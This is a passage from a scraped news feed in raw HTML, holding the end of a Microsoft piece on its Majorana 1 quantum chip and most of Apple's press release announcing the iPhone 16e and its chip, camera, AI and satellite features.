<p>“Ironically, it’s also why we need a quantum computer – because understanding these materials is incredibly hard. With a scaled quantum computer, we will be able to predict materials with even better properties for building the next generation of quantum computers beyond scale,” she said.</p>



<p><strong>Related links:</strong></p>



<p>Learn more: <a href="https://news.microsoft.com/azure-quantum/">Introducing Microsoft Majorana 1</a></p>



<p>Read more: <a href="https://aka.ms/MSQuantumAQblog">Microsoft unveils Majorana 1, the world’s first quantum processor powered by topological qubits</a></p>



<p>Learn more: <a href="https://quantum.microsoft.com/en-us/quantum-ready/get-started">Microsoft’s Quantum Ready program</a></p>



<p>Learn more: <a href="https://quantum.microsoft.com/en-us/solutions/azure-quantum-solutions">Azure Quantum Solutions</a> &nbsp;</p>



<p>Read more: <a href="https://news.microsoft.com/source/features/innovation/azure-quantum-majorana-topological-qubit/">In a historic milestone, Azure Quantum demonstrates formerly elusive physics needed to build scalable topological qubits</a></p>



<p>Read more: <a href="https://www.nature.com/articles/s41586-024-08445-2">Nature: Interferometric Single-Shot Parity Measurement in InAs-Al Hybrid Devices</a></p>



<p>Read more: <a href="https://aka.ms/MSBrandArXivTopo">arXiv: Roadmap to fault tolerant quantum computation using topological qubit arrays</a></p>



<p><em>Top image: Majorana 1, the first quantum chip powered by a Topological Core based on a revolutionary new class of materials developed by Microsoft. Photo by John Brecher for Microsoft.&nbsp;</em></p>

</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Apple Debuts iPhone 16e (232 pts)]]></title>
            <link>https://www.apple.com/newsroom/2025/02/apple-debuts-iphone-16e-a-powerful-new-member-of-the-iphone-16-family/</link>
            <guid>43103536</guid>
            <pubDate>Wed, 19 Feb 2025 16:00:25 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.apple.com/newsroom/2025/02/apple-debuts-iphone-16e-a-powerful-new-member-of-the-iphone-16-family/">https://www.apple.com/newsroom/2025/02/apple-debuts-iphone-16e-a-powerful-new-member-of-the-iphone-16-family/</a>, See on <a href="https://news.ycombinator.com/item?id=43103536">Hacker News</a></p>
<div id="readability-page-1" class="page">


	
    







 
<nav id="ac-localnav" lang="en-US" role="navigation" aria-label="Newsroom" data-analytics-region="local nav" data-sticky="">
	
    
    
        




    
    
    
	
	

</nav>





<main id="main" role="main"> 




<span id="opens-in-new-window">opens in new window</span>
<section>
<article data-analytics-activitymap-region-id="article">






    
    
    









    





    <div>
        
		
        <div>
                    
                    
                        <span>PRESS RELEASE</span>
                    
                    
                        <span>February 19, 2025</span>
                    
                    
                </div>

        <div>
                
                
                
                    <h2>
                        
    
        Apple debuts iPhone&nbsp;16e: A&nbsp;powerful new member of the iPhone&nbsp;16 family
    

                    </h2>
                
            </div>

        <div>
                
                
                    iPhone 16e joins the iPhone 16 lineup, featuring the fast performance of the A18 chip, Apple Intelligence, extraordinary battery life, and a 48MP 2-in-1 camera system — all at an incredible value
                
            </div>

        
            
    
    
    
    
    

        

    </div>







    
    
    


    
        
        
        
        
            <figure aria-label="Media, Two white iPhone 16e devices shown back to back.">
                <div>
                         
                            
                            <div>
                                Introducing iPhone 16e, the most affordable member of the iPhone 16 family.
                            </div>
                        
                        
                        
                        
                        <a href="https://www.apple.com/newsroom/images/2025/02/apple-debuts-iphone-16e-a-powerful-new-member-of-the-iphone-16-family/article/Apple-iPhone-16e-hero-250219.zip" download="" data-analytics-title="download image - Apple-iPhone-16e-hero-250219_inline" aria-label="Download media, Two white iPhone 16e devices shown back to back."></a>
                    </div>
            </figure>
        
    










    
    
    


     
     
    
    
        <div>
             
                 <div><strong><span>CUPERTINO, CALIFORNIA</span>&nbsp;</strong>Apple today announced <a href="https://www.youtube.com/watch?v=mFuyX1XgJFg" target="_blank" rel="nofollow" data-analytics-exit-link="">iPhone 16e</a>, a new addition to the iPhone 16 lineup that offers powerful capabilities at a more affordable price. iPhone 16e delivers fast, smooth performance and breakthrough battery life, thanks to the industry-leading efficiency of the A18 chip and the new Apple C1, the first cellular modem designed by Apple. iPhone 16e is also built for Apple Intelligence, the intuitive personal intelligence system that delivers helpful and relevant intelligence while taking an extraordinary step forward for privacy in AI. The 48MP Fusion camera takes gorgeous photos and videos, and with an integrated 2x Telephoto, it is like having two cameras in one, so users can zoom in with optical quality. When outside of cellular and Wi-Fi coverage, Apple’s groundbreaking satellite features — including Emergency SOS, Roadside Assistance, Messages, and Find My via satellite — help iPhone 16e users stay connected and get assistance when it matters most.<sup>1</sup>
</div>
                 
             
                 <div>iPhone 16e will be available in two elegant matte finishes — black and white — with colorful cases available to accessorize. Pre-orders begin Friday, February 21, with availability beginning Friday, February 28.
</div>
                 
             
                 <div>“iPhone 16e packs in the features our users love about the iPhone 16 lineup, including breakthrough battery life, fast performance powered by the latest-generation A18 chip, an innovative 2-in-1 camera system, and Apple Intelligence,” said Kaiann Drance, Apple’s vice president of Worldwide iPhone Product Marketing. “We’re so excited for iPhone 16e to complete the lineup as a powerful, more affordable option to bring the iPhone experience to even more people.”
</div>
                 
             
         </div>
 

    
    
    






  
    
    
    
    
      <figure aria-label="Media, Two white iPhone 16 devices stacked on top of each other.">
        <div>
             
              
              <div>
                Available in a popular 6.1-inch display size, iPhone 16e features breakthrough battery life, fast performance, a 48MP 2-in-1 camera system, and a beautiful, durable design.
              </div>
            
            
            
            
            <a href="https://www.apple.com/newsroom/images/2025/02/apple-debuts-iphone-16e-a-powerful-new-member-of-the-iphone-16-family/article/Apple-iPhone-16e-2-up-250219.zip" download="" data-analytics-title="download image - Apple-iPhone-16e-2-up-250219_big" aria-label="Download media, Two white iPhone 16 devices stacked on top of each other."></a>
          </div>
      </figure>
    
  






    
    
    


     
     
    
    
        <div>
             
                 <h2><strong>A Beautiful and Durable Design with Breakthrough Battery&nbsp;Life</strong>
</h2>
                 
             
                 <div>iPhone 16e is built to last, featuring splash, water, and dust resistance with a rating of IP68; the Ceramic Shield front cover with an advanced formulation that is tougher than any smartphone glass; and the toughest back glass in a smartphone.<sup>2</sup> The 6.1-inch Super Retina XDR display with OLED technology has an edge-to-edge design that is perfect for watching HDR videos, playing games, and reading crisp text.<sup>3</sup> iPhone 16e has the best battery life ever on a 6.1-inch iPhone, lasting up to six hours longer than iPhone 11 and up to 12 hours longer than all generations of iPhone SE.<sup>4</sup> And with Face ID enabled by the TrueDepth camera system, users can securely unlock their iPhone, authenticate purchases, sign in to apps, and more. iPhone 16e also offers convenient charging options, including both wireless charging and USB-C for easy connection to a wide range of accessories.
</div>
                 
             
         </div>
 

    
    
    


    
    
        
        
        
            <div role="group" aria-label="gallery" data-component-list="MixinGallery" id="iphone-16e-design">
            <nav role="presentation">
                <ul role="tablist">
                    
                        <li role="presentation">
                            <a id="gallery-dotnav-8317016814f7a95251202a1645ce5d74" href="#gallery-8317016814f7a95251202a1645ce5d74" data-ac-gallery-trigger="gallery-8317016814f7a95251202a1645ce5d74"><span>A matte white and a matte black iPhone 16e, side by side. </span></a>
                        </li>
                    
                        <li role="presentation">
                            <a id="gallery-dotnav-cf158fb53b54c12e21819131135900b0" href="#gallery-cf158fb53b54c12e21819131135900b0" data-ac-gallery-trigger="gallery-cf158fb53b54c12e21819131135900b0"><span>The 6.1-inch display and back camera on iPhone 16e.</span></a>
                        </li>
                    
                        <li role="presentation">
                            <a id="gallery-dotnav-90a221678acd651f124b4116ad4993ee" href="#gallery-90a221678acd651f124b4116ad4993ee" data-ac-gallery-trigger="gallery-90a221678acd651f124b4116ad4993ee"><span>A close-up of the USB-C port on iPhone 16e.</span></a>
                        </li>
                    
                </ul>
            </nav>
            <div>
                
                    
                        
                        <div id="gallery-8317016814f7a95251202a1645ce5d74" aria-labelledby="gallery-dotnav-8317016814f7a95251202a1645ce5d74" data-gallery-item="">
                            <figure role="presentation" data-analytics-activitymap-region-id="Gallery:colors">
                                
                                <div>
                                    <div>iPhone 16e is available in elegant matte white and black finishes with a splash-, water-, and dust-resistant design.</div>
                                    
                                    
                                    <a href="https://www.apple.com/newsroom/images/2025/02/apple-debuts-iphone-16e-a-powerful-new-member-of-the-iphone-16-family/article/Apple-iPhone-16e-color-lineup-back-250219.zip" download="" data-analytics-title="download image - Apple-iPhone-16e-color-lineup-back-250219_inline" aria-label="Download media, A matte white and a matte black iPhone 16e, side by side. "></a>
                                </div>
                            </figure>
                        </div>
                        
                    
                
                    
                        
                        <div id="gallery-cf158fb53b54c12e21819131135900b0" aria-labelledby="gallery-dotnav-cf158fb53b54c12e21819131135900b0" data-gallery-item="">
                            <figure role="presentation" data-analytics-activitymap-region-id="Gallery:camera-and-display">
                                
                                <div>
                                    <div>iPhone 16e features the toughest back glass in a smartphone, and the brilliant 6.1-inch display is protected by the Ceramic Shield, which is tougher than any smartphone glass.</div>
                                    
                                    
                                    <a href="https://www.apple.com/newsroom/images/2025/02/apple-debuts-iphone-16e-a-powerful-new-member-of-the-iphone-16-family/article/Apple-iPhone-16e-front-and-back-250219.zip" download="" data-analytics-title="download image - Apple-iPhone-16e-front-and-back-250219_inline" aria-label="Download media, The 6.1-inch display and back camera on iPhone 16e."></a>
                                </div>
                            </figure>
                        </div>
                        
                    
                
                    
                        
                        <div id="gallery-90a221678acd651f124b4116ad4993ee" aria-labelledby="gallery-dotnav-90a221678acd651f124b4116ad4993ee" data-gallery-item="">
                            <figure role="presentation" data-analytics-activitymap-region-id="Gallery:usb-c">
                                
                                <div>
                                    <div>iPhone 16e features USB-C, so the same cable can charge iPhone, Mac, iPad, AirPods, and other devices.</div>
                                    
                                    
                                    <a href="https://www.apple.com/newsroom/images/2025/02/apple-debuts-iphone-16e-a-powerful-new-member-of-the-iphone-16-family/article/Apple-iPhone-16e-USB-C-250219.zip" download="" data-analytics-title="download image - Apple-iPhone-16e-USB-C-250219_inline" aria-label="Download media, A close-up of the USB-C port on iPhone 16e."></a>
                                </div>
                            </figure>
                        </div>
                        
                    
                
            </div>
            
                
                
                <nav role="presentation">
                    
                        <ul>
                            <li>
                                
                            </li>
                            <li>
                                
                            </li>
                        </ul>
                    
                </nav>
            
        </div>
    


    
    
    


     
     
    
    
        <div>
             
                 <h2><strong>Performance and Connectivity</strong>
</h2>
                 
             
                 <div>iPhone 16e is powered by Apple’s latest-generation A18 chip, which enables fast, smooth performance, incredible power efficiency, and Apple Intelligence. The 6-core CPU is up to 80 percent faster than the A13 Bionic chip on iPhone 11, handling both everyday and intensive tasks with ease — from simple workloads, to more demanding actions with Apple Intelligence. The 4-core GPU powers stunning graphics performance and unlocks next-level mobile gaming on the go, enabling graphically demanding AAA titles and hardware-accelerated ray tracing for more realistic lighting and reflections. The 16-core Neural Engine is optimized for large generative models and runs machine learning (ML) models up to 6x faster than A13 Bionic.
</div>
                 
             
         </div>
 

    
    
    


    
    <div data-component-list="ScrollAnimationDefault AutoPlayVideo">
        <div>The A18 chip enables fast, smooth performance and stunning graphics for next-level mobile gaming in titles like Infinity Nikki.</div>
        
            <a aria-label="Download video: Infinity Nikki on iPhone 16e" data-analytics-title="Download video - Infinity Nikki on iPhone 16e" download="" href="https://www.apple.com/newsroom/videos/2025/autoplay/02/apple-iphone-16e-gaming-infinity-nikki-250219/downloads/Apple-iPhone-16e-gaming-Infinity-Nikki-250219.zip">
            </a>
        
    </div>






    
    
    


     
     
    
    
        <div>
             
                 <div>Expanding the benefits of Apple silicon, C1 is the first modem designed by Apple and the most power-efficient modem ever on an iPhone, delivering fast and reliable 5G cellular connectivity. Apple silicon — including C1 — the all-new internal design, and the advanced power management of iOS 18 all contribute to extraordinary battery life.
</div>
                 
             
                 <h2><strong>Built for Apple Intelligence</strong>
</h2>
                 
             
                 <div>iPhone 16e is built for Apple Intelligence, unlocking exciting new capabilities that make iPhone even more helpful and powerful. With the Clean Up tool, it’s easy to remove distracting elements in images, and natural language search in the Photos app allows users to search for just about any photo or video by simply describing what they are looking for.
</div>
                 
             
         </div>
 

    
    
    


    
    <div data-component-list="ScrollAnimationDefault AutoPlayVideo">
        <div>Clean Up in Photos, powered by Apple Intelligence, allows users to remove distractions from an image.</div>
        
            <a aria-label="Download video: Clean Up on iPhone 16e" data-analytics-title="Download video - Clean Up on iPhone 16e" download="" href="https://www.apple.com/newsroom/videos/2025/autoplay/02/apple-iphone-16e-apple-intelligence-clean-up-250219/downloads/Apple-iPhone-16e-Apple-Intelligence-Clean-Up-250219.zip">
            </a>
        
    </div>






    
    
    


     
     
    
    
        <div>Users can also explore creative new ways to express themselves visually with Image Playground, create the perfect emoji with Genmoji, and make their writing even more dynamic with Writing Tools. They can now type to Siri, and Siri is more conversational with the ability to follow along if users stumble over their words. Siri can also maintain context from one request to the next. With extensive product knowledge, Siri can answer thousands of questions about the features and settings of Apple products, so users can learn how to do things like take a screen recording or schedule a text message to send later.
</div>
 

    
    
    


    
    
        
        
        
            <div role="group" aria-label="gallery" data-component-list="MixinGallery" id="iphone-16e-apple-intelligence-features">
            <nav role="presentation">
                <ul role="tablist">
                    
                        <li role="presentation">
                            <a id="gallery-dotnav-0f752465b9c1e9370e2a0c7fa9ee7ae8" href="#gallery-0f752465b9c1e9370e2a0c7fa9ee7ae8" data-ac-gallery-trigger="gallery-0f752465b9c1e9370e2a0c7fa9ee7ae8"><span>Image Playground editor displayed on iPhone 16e.</span></a>
                        </li>
                    
                        <li role="presentation">
                            <a id="gallery-dotnav-75d55735cd62ecede6a522b7a89908f7" href="#gallery-75d55735cd62ecede6a522b7a89908f7" data-ac-gallery-trigger="gallery-75d55735cd62ecede6a522b7a89908f7"><span>Genmoji creation on iPhone 16e.</span></a>
                        </li>
                    
                </ul>
            </nav>
            <div>
                
                    
                        
                        <div id="gallery-0f752465b9c1e9370e2a0c7fa9ee7ae8" aria-labelledby="gallery-dotnav-0f752465b9c1e9370e2a0c7fa9ee7ae8" data-gallery-item="">
                            <figure role="presentation" data-analytics-activitymap-region-id="Gallery:image-playground">
                                
                                <div>
                                    <div>Image Playground allows users to easily create fun and unique images, with concepts like themes, costumes, accessories, and places.</div>
                                    
                                    
                                    <a href="https://www.apple.com/newsroom/images/2025/02/apple-debuts-iphone-16e-a-powerful-new-member-of-the-iphone-16-family/article/Apple-iPhone-16e-Apple-Intelligence-Image-Playground-250219.zip" download="" data-analytics-title="download image - Apple-iPhone-16e-Apple-Intelligence-Image-Playground-250219_inline" aria-label="Download media, Image Playground editor displayed on iPhone 16e."></a>
                                </div>
                            </figure>
                        </div>
                        
                    
                
                    
                        
                        <div id="gallery-75d55735cd62ecede6a522b7a89908f7" aria-labelledby="gallery-dotnav-75d55735cd62ecede6a522b7a89908f7" data-gallery-item="">
                            <figure role="presentation" data-analytics-activitymap-region-id="Gallery:genmoji">
                                
                                <div>
                                    <div>Users can create their&nbsp;own unique Genmoji, making conversations with family and friends more fun and playful.</div>
                                    
                                    
                                    <a href="https://www.apple.com/newsroom/images/2025/02/apple-debuts-iphone-16e-a-powerful-new-member-of-the-iphone-16-family/article/Apple-iPhone-16e-Apple-Intelligence-Genmoji-250219.zip" download="" data-analytics-title="download image - Apple-iPhone-16e-Apple-Intelligence-Genmoji-250219_inline" aria-label="Download media, Genmoji creation on iPhone 16e."></a>
                                </div>
                            </figure>
                        </div>
                        
                    
                
            </div>
            
                
                
                <nav role="presentation">
                    
                        <ul>
                            <li>
                                
                            </li>
                            <li>
                                
                            </li>
                        </ul>
                    
                </nav>
            
        </div>
    


    
    
    


     
     
    
    
        <div>With access to ChatGPT seamlessly integrated into Writing Tools and Siri, users can choose to access ChatGPT’s expertise without jumping between applications,&nbsp;so they can get things done faster and easier than ever before. In addition, users can access ChatGPT for free without creating an account, and privacy protections are built in — their IP addresses are obscured and OpenAI won’t store requests. Users can choose whether to enable ChatGPT integration, and are in full control of when to use it and what information is shared with ChatGPT.
</div>
 

    
    
    


    
    <div data-component-list="ScrollAnimationDefault AutoPlayVideo">
        <div>With Siri, users can choose to access ChatGPT’s expertise without jumping between applications.</div>
        
            <a aria-label="Download video: Speak to Siri on iPhone 16e" data-analytics-title="Download video - Speak to Siri on iPhone 16e" download="" href="https://www.apple.com/newsroom/videos/2025/autoplay/02/apple-iphone-16e-apple-intelligence-speak-to-siri-with-chat-gpt-250219/downloads/Apple-iPhone-16e-Apple-Intelligence-Speak-to-Siri-with-Chat-GPT-250219.zip">
            </a>
        
    </div>






    
    
    


     
     
    
    
        <div>
             
                 <div>Apple Intelligence marks an extraordinary step forward for privacy in AI and is designed to protect users’ privacy at every step. It starts with on-device processing, meaning that many of the models that power Apple Inteligence run entirely on device. For requests that require access to larger models, Apple’s groundbreaking Private Cloud Compute extends the privacy and security of iPhone into the cloud to unlock even more intelligence. When using Private Cloud Compute, users’ data is never stored or shared with Apple; it is used only to fulfill their request.
</div>
                 
             
                 <h2><strong>Access Favorite Features and Unlock Visual Intelligence with the Action Button</strong>
</h2>
                 
             
                 <div>iPhone 16e features the Action button, allowing users to easily access a variety of functions with just a press. Once customized in Settings, the Action button can be used to quickly open the camera or flashlight; switch between Ring and Silent modes; recognize music with Shazam; activate Voice Memos, Focus, Translate, and accessibility features like Magnifier; or use Shortcuts for more options. The Action button can even access in-app functionality like launching the camera in Snapchat, unlocking a car door with FordPass, tracking a child’s sleep schedule with Napper, and more.
</div>
                 
             
         </div>
 

    
    
    


    
    <div data-component-list="ScrollAnimationDefault AutoPlayVideo">
        <div>The Action button allows users to quickly access their favorite features. By default, it switches between Ring and Silent, or users can choose from a wide set of actions for even more convenience and versatility.</div>
        
            <a aria-label="Download video: Action button on iPhone 16e" data-analytics-title="Download video - Action button on iPhone 16e" download="" href="https://www.apple.com/newsroom/videos/2025/autoplay/02/apple-iphone-16e-action-button-250219/downloads/Apple-iPhone-16e-Action-button-250219.zip">
            </a>
        
    </div>






    
    
    


     
     
    
    
        <div>The Action button on iPhone 16e also unlocks a new visual intelligence experience that builds on Apple Intelligence to help users learn about objects and places. Visual intelligence can summarize and copy text, translate text between languages, detect phone numbers or email addresses with the option to add to contacts, identify an animal or plant, and more. Visual intelligence also allows users to search Google so they can see where they can buy an item, or benefit from ChatGPT’s problem-solving skills. Users are in control of when third-party tools are used and what information is shared.
</div>
 

    
    
    


    
        
        
        
        
            <figure aria-label="Media, An image of a plant with a description from ChatGPT using the Action button for visual intelligence.">
                <div>
                         
                            
                            <div>
                                With the Action button on iPhone 16e, users can also access visual intelligence to learn about objects and places around them.
                            </div>
                        
                        
                        
                        
                        <a href="https://www.apple.com/newsroom/images/2025/02/apple-debuts-iphone-16e-a-powerful-new-member-of-the-iphone-16-family/article/Apple-iPhone-16e-Visual-Intelligence-250219.zip" download="" data-analytics-title="download image - Apple-iPhone-16e-Visual-Intelligence-250219_inline" aria-label="Download media, An image of a plant with a description from ChatGPT using the Action button for visual intelligence."></a>
                    </div>
            </figure>
        
    










    
    
    


     
     
    
    
        <div>
             
                 <h2><strong>A Powerful Camera System to Capture Any Moment</strong>
</h2>
                 
             
                 <div>The powerful 2-in-1 camera system on iPhone 16e is perfect for capturing everyday moments and important memories, including in Night mode and Portrait mode. Using computational photography, the 48MP Fusion camera takes super-high-resolution photos, so users can capture gorgeous images that balance light and detail. With an integrated 2x Telephoto, users have the equivalent of two cameras in one, and can zoom in with optical quality to get closer to the subject and easily frame their shot. And the front-facing TrueDepth camera with autofocus enables sharper close-ups and beautiful group selfies. The latest generation of HDR captures subjects and the background with true-to-life renderings of skin tones, while ensuring photos have bright highlights, rich mid-tones, and deep shadows.
</div>
                 
             
         </div>
 

    
    
    


    
    
        
        
        
            <div role="group" aria-label="gallery" data-component-list="MixinGallery" id="iphone-16e-camera-features">
            <nav role="presentation">
                <ul role="tablist">
                    
                        <li role="presentation">
                            <a id="gallery-dotnav-d3c9a461d9581f37bbb12d9e4e6023b0" href="#gallery-d3c9a461d9581f37bbb12d9e4e6023b0" data-ac-gallery-trigger="gallery-d3c9a461d9581f37bbb12d9e4e6023b0"><span>A photo taken with the 48MP Fusion camera on iPhone 16e.</span></a>
                        </li>
                    
                        <li role="presentation">
                            <a id="gallery-dotnav-bc01c7effeed35fd6e4f857270a2a847" href="#gallery-bc01c7effeed35fd6e4f857270a2a847" data-ac-gallery-trigger="gallery-bc01c7effeed35fd6e4f857270a2a847"><span>A photo taken using the 2x Telephoto with the 48MP Fusion camera on iPhone 16e.</span></a>
                        </li>
                    
                        <li role="presentation">
                            <a id="gallery-dotnav-f07ae6ece358a45575bf135ee487c501" href="#gallery-f07ae6ece358a45575bf135ee487c501" data-ac-gallery-trigger="gallery-f07ae6ece358a45575bf135ee487c501"><span>A photo taken in Portrait mode on the iPhone 16e.</span></a>
                        </li>
                    
                        <li role="presentation">
                            <a id="gallery-dotnav-31f8e16a2765d9b0339be19f4ebc3159" href="#gallery-31f8e16a2765d9b0339be19f4ebc3159" data-ac-gallery-trigger="gallery-31f8e16a2765d9b0339be19f4ebc3159"><span>A photo taken at night using iPhone 16e.</span></a>
                        </li>
                    
                        <li role="presentation">
                            <a id="gallery-dotnav-4e6d09758e26272bc67614287e509eb2" href="#gallery-4e6d09758e26272bc67614287e509eb2" data-ac-gallery-trigger="gallery-4e6d09758e26272bc67614287e509eb2"><span>A photo taken in low light using iPhone 16e.</span></a>
                        </li>
                    
                        <li role="presentation">
                            <a id="gallery-dotnav-f9210535455b3b5ddfce995bd006f9fa" href="#gallery-f9210535455b3b5ddfce995bd006f9fa" data-ac-gallery-trigger="gallery-f9210535455b3b5ddfce995bd006f9fa"><span>A selfie taken using the front-facing TrueDepth camera on iPhone 16e.</span></a>
                        </li>
                    
                </ul>
            </nav>
            <div>
                
                    
                        
                        <div id="gallery-d3c9a461d9581f37bbb12d9e4e6023b0" aria-labelledby="gallery-dotnav-d3c9a461d9581f37bbb12d9e4e6023b0" data-gallery-item="">
                            <figure role="presentation" data-analytics-activitymap-region-id="Gallery:fusion-camera">
                                
                                <div>
                                    <div>iPhone 16e features a custom 48MP Fusion camera to take beautiful photos and videos.</div>
                                    
                                    
                                    <a href="https://www.apple.com/newsroom/images/2025/02/apple-debuts-iphone-16e-a-powerful-new-member-of-the-iphone-16-family/article/Apple-iPhone-16e-48MP-Fusion-photography-250219.zip" download="" data-analytics-title="download image - Apple-iPhone-16e-48MP-Fusion-photography-250219_big" aria-label="Download media, A photo taken with the 48MP Fusion camera on iPhone 16e."></a>
                                </div>
                            </figure>
                        </div>
                        
                    
                
                    
                        
                        <div id="gallery-bc01c7effeed35fd6e4f857270a2a847" aria-labelledby="gallery-dotnav-bc01c7effeed35fd6e4f857270a2a847" data-gallery-item="">
                            <figure role="presentation" data-analytics-activitymap-region-id="Gallery:telephoto">
                                
                                <div>
                                    <div>With an integrated 2x Telephoto, the 48MP Fusion camera delivers the capability of two cameras in one, so users can zoom in with optical quality.</div>
                                    
                                    
                                    <a href="https://www.apple.com/newsroom/images/2025/02/apple-debuts-iphone-16e-a-powerful-new-member-of-the-iphone-16-family/article/Apple-iPhone-16e-Fusion-2x-Telephoto-photography-250219.zip" download="" data-analytics-title="download image - Apple-iPhone-16e-Fusion-2x-Telephoto-photography-250219_big" aria-label="Download media, A photo taken using the 2x Telephoto with the 48MP Fusion camera on iPhone 16e."></a>
                                </div>
                            </figure>
                        </div>
                        
                    
                
                    
                        
                        <div id="gallery-f07ae6ece358a45575bf135ee487c501" aria-labelledby="gallery-dotnav-f07ae6ece358a45575bf135ee487c501" data-gallery-item="">
                            <figure role="presentation" data-analytics-activitymap-region-id="Gallery:portrait-mode">
                                
                                <div>
                                    <div>iPhone 16e features Portrait mode, which creates beautiful studio-like images of a subject.</div>
                                    
                                    
                                    <a href="https://www.apple.com/newsroom/images/2025/02/apple-debuts-iphone-16e-a-powerful-new-member-of-the-iphone-16-family/article/Apple-iPhone-16e-Portrait-mode-photography-250219.zip" download="" data-analytics-title="download image - Apple-iPhone-16e-Portrait-mode-photography-250219_big" aria-label="Download media, A photo taken in Portrait mode on the iPhone 16e."></a>
                                </div>
                            </figure>
                        </div>
                        
                    
                
                    
                        
                        <div id="gallery-31f8e16a2765d9b0339be19f4ebc3159" aria-labelledby="gallery-dotnav-31f8e16a2765d9b0339be19f4ebc3159" data-gallery-item="">
                            <figure role="presentation" data-analytics-activitymap-region-id="Gallery:night-mode">
                                
                                <div>
                                    <div>Night mode on iPhone 16e captures more detail in photos when it is dark.</div>
                                    
                                    
                                    <a href="https://www.apple.com/newsroom/images/2025/02/apple-debuts-iphone-16e-a-powerful-new-member-of-the-iphone-16-family/article/Apple-iPhone-16e-Night-mode-photography-250219.zip" download="" data-analytics-title="download image - Apple-iPhone-16e-Night-mode-photography-250219_big" aria-label="Download media, A photo taken at night using iPhone 16e."></a>
                                </div>
                            </figure>
                        </div>
                        
                    
                
                    
                        
                        <div id="gallery-4e6d09758e26272bc67614287e509eb2" aria-labelledby="gallery-dotnav-4e6d09758e26272bc67614287e509eb2" data-gallery-item="">
                            <figure role="presentation" data-analytics-activitymap-region-id="Gallery:low-light">
                                
                                <div>
                                    <div>Users can capture memories of friends and family — even in different lighting conditions.</div>
                                    
                                    
                                    <a href="https://www.apple.com/newsroom/images/2025/02/apple-debuts-iphone-16e-a-powerful-new-member-of-the-iphone-16-family/article/Apple-iPhone-16e-low-light-photography-250219.zip" download="" data-analytics-title="download image - Apple-iPhone-16e-low-light-photography-250219_big" aria-label="Download media, A photo taken in low light using iPhone 16e."></a>
                                </div>
                            </figure>
                        </div>
                        
                    
                
                    
                        
                        <div id="gallery-f9210535455b3b5ddfce995bd006f9fa" aria-labelledby="gallery-dotnav-f9210535455b3b5ddfce995bd006f9fa" data-gallery-item="">
                            <figure role="presentation" data-analytics-activitymap-region-id="Gallery:truedepth">
                                
                                <div>
                                    <div>The front-facing TrueDepth camera takes gorgeous selfies and videos with great color and detail.</div>
                                    
                                    
                                    <a href="https://www.apple.com/newsroom/images/2025/02/apple-debuts-iphone-16e-a-powerful-new-member-of-the-iphone-16-family/article/Apple-iPhone-16e-front-facing-TrueDepth-photography-250219.zip" download="" data-analytics-title="download image - Apple-iPhone-16e-front-facing-TrueDepth-photography-250219_big" aria-label="Download media, A selfie taken using the front-facing TrueDepth camera on iPhone 16e."></a>
                                </div>
                            </figure>
                        </div>
                        
                    
                
            </div>
            
                
                
                <nav role="presentation">
                    
                        <ul>
                            <li>
                                
                            </li>
                            <li>
                                
                            </li>
                        </ul>
                    
                </nav>
            
        </div>
    


    
    
    


     
     
    
    
        <div>iPhone 16e takes stunning videos with the ability to record in 4K with Dolby Vision up to 60 fps, and users can stop and restart a recording for more flexibility when capturing the moment. iPhone 16e also records video in Spatial Audio for immersive listening with AirPods, Apple Vision Pro, or a surround sound system, and enables more ways to edit video sound with Audio Mix. Users can adjust their sound after capture to focus on the voice of the person on camera, make it sound like the video was recorded inside a professional studio, or position vocal tracks in the front and environmental noises in surround sound. With wind noise reduction, powerful ML algorithms automatically reduce unwanted noise for better audio quality.
</div>
 

    
    
    


    
    <div data-component-list="ScrollAnimationDefault AutoPlayVideo">
        <div>iPhone 16e can capture stunning 4K video at 60 fps in Dolby Vision.</div>
        
            <a aria-label="Download video: 4K video on iPhone 16e" data-analytics-title="Download video - 4K video on iPhone 16e" download="" href="https://www.apple.com/newsroom/videos/2025/autoplay/02/apple-iphone-16e-4k-video-with-dolby-vision-250219/downloads/Apple-iPhone-16e-4K-video-with-Dolby-Vision-250219.zip">
            </a>
        
    </div>






    
    
    


     
     
    
    
        <div>
             
                 <h2><strong>Groundbreaking Safety and Communication Capabilities</strong>
</h2>
                 
             
                 <div>iPhone 16e helps users stay connected and get assistance when it matters most. Apple’s satellite features help users text via satellite when they’re outside of cellular and Wi-Fi coverage. This includes Messages via satellite to text friends and family; Emergency SOS via satellite to connect with emergency services; and Roadside Assistance via satellite to reach a roadside assistance provider in case of car trouble. Users can also use the Find My app to share their location via satellite, reassuring friends and family of their whereabouts while traveling off the grid. Crash Detection on iPhone 16e can detect a severe car crash and automatically dial emergency services if a user is unconscious or unable to reach their iPhone.<sup>5</sup>
</div>
                 
             
         </div>
 

    
    
    


    
    
        
        
        
            <div role="group" aria-label="gallery" data-component-list="MixinGallery" id="iphone-16e-emergency-services">
            <nav role="presentation">
                <ul role="tablist">
                    
                        <li role="presentation">
                            <a id="gallery-dotnav-76ed2f2456096dcab6f6f3e15745395f" href="#gallery-76ed2f2456096dcab6f6f3e15745395f" data-ac-gallery-trigger="gallery-76ed2f2456096dcab6f6f3e15745395f"><span>Messages via satellite displayed on iPhone 16e.</span></a>
                        </li>
                    
                        <li role="presentation">
                            <a id="gallery-dotnav-fb08b0775c8a8564358de47c4c0d96dc" href="#gallery-fb08b0775c8a8564358de47c4c0d96dc" data-ac-gallery-trigger="gallery-fb08b0775c8a8564358de47c4c0d96dc"><span>Emergency SOS via satellite displayed on iPhone 16e.</span></a>
                        </li>
                    
                        <li role="presentation">
                            <a id="gallery-dotnav-9ef0bdcebc4284b3335f21b1f9e6debb" href="#gallery-9ef0bdcebc4284b3335f21b1f9e6debb" data-ac-gallery-trigger="gallery-9ef0bdcebc4284b3335f21b1f9e6debb"><span>Find My app via satellite displayed on iPhone 16e.</span></a>
                        </li>
                    
                        <li role="presentation">
                            <a id="gallery-dotnav-c2e7464af01f9aee9794f49751c3d0a4" href="#gallery-c2e7464af01f9aee9794f49751c3d0a4" data-ac-gallery-trigger="gallery-c2e7464af01f9aee9794f49751c3d0a4"><span>Roadside Assistance via satellite displayed on iPhone 16e.</span></a>
                        </li>
                    
                        <li role="presentation">
                            <a id="gallery-dotnav-9a476baaf0e4a5b5fab5c93950abae84" href="#gallery-9a476baaf0e4a5b5fab5c93950abae84" data-ac-gallery-trigger="gallery-9a476baaf0e4a5b5fab5c93950abae84"><span>Crash Detection displayed on iPhone 16e.</span></a>
                        </li>
                    
                </ul>
            </nav>
            <div>
                
                    
                        
